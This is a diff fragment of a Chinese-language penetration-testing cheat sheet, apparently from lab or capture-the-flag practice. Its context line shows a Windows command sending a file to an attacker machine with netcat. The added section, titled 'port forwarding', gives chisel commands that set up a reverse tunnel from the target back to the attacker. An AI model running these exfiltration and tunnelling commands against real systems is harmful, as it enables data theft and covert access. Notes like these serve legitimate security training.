@@ -99,3 +99,15 @@ cmd /c "C:\Utils\nc64.exe 10.10.16.58 408 < C:\Utils\out.txt"
 └─$ ls -liah out.txt 
 2782113 -rw-rw-r-- 1 kali kali 127K Mar 17 09:10 out.txt
 ```
+
+## 端口转发
+
+### chisel
+
+```kali
+chisel server -p 9595 --reverse
+```
+
+```machines
+chisel.exe client 10.10.16.58:9595 R:127.0.0.1:1443
+```
